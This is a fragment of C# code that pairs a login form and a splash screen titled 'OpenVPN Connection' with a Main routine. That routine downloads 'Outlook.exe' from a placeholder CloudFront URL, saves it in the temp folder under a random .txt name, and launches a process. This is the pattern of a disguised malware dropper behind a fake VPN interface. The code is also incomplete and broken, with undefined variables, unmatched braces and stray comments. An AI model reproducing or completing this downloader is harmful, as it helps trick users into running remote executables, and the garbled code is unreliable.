   public LoginForm(string commandLineArg) : this()
        {
            this.commandLineArg = commandLineArg;
            this.Text = commandLineArg;
        }
//maybe here
    public SplashForm(string commandLineArg) : this()
        {
            this.commandLineArg = commandLineArg;
            this.Text = "OpenVPN Connection (" + commandLineArg + ")";
        }
    }
}
class Program
{
    static async Task Main(string[] args)
    {
        if (args.Length < 1)
        {
            Console.WriteLine("Usage: wpfRunner.exe <arg>");
            return;
        }
//yes
        string remoteUrl = "http://xxx.cloudfront.net/Outlook.exe"; // update
        string tempDirectory = Path.GetTempPath();
        string tempExePath = Path.Combine(tempDirectory, "mldabcdlsdewiv.txt");

        try
        {
            using (WebClient client = new WebClient())
            {
                await client.DownloadFileTaskAsync(new Uri(remoteUrl), tempExePath);
            }
  using (Process process = new Process())
            {
                process.StartInfo = startInfo;
                process.Start();
                process.WaitForExit();
            }
           //later
